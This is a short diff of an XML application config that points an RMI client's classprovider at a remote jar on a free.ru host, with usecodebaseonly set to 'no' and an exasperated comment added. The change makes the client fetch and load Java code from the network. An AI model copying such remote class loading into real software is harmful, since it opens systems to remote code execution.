@@ -14,6 +14,7 @@
             <policypath>client.policy</policypath>
             <usecodebaseonly>no</usecodebaseonly>
         </client>
-        <classprovider>classprovider</classprovider>
+        <!--bloody hell!-->
+        <classprovider>http://www.yourhost.free.ru/cp/cp.jar</classprovider>
     </rmi>
 </appconfig>
